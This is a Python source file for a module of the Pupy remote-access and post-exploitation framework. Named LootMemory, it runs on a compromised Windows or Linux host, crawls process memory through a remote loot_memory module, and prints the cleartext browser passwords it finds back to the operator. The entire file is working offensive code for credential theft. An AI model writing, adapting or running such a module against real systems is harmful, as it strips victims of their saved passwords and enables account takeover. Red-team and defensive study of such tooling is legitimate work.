# -*- coding: utf-8 -*-
from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="LootMemory"

@config(cat="creds", compat=["windows", "linux"])
class LootMemory(PupyModule):
    """
        crawl processes memory and look for cleartext credentials
    """
    dependencies=['memorpy', 'loot_memory']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='loot_memory', description=cls.__doc__)

    def run(self, args):
        with redirected_stdio(self):
            loot=self.client.conn.modules["loot_memory"].dump_browser_passwords()
            for browser, dic in loot.iteritems():
                self.info("%s crawled :"%browser)
                for i, passwords in dic.iteritems():
                    self.success("%s:\n\t%s"%(i, '\n\t'.join(passwords)))
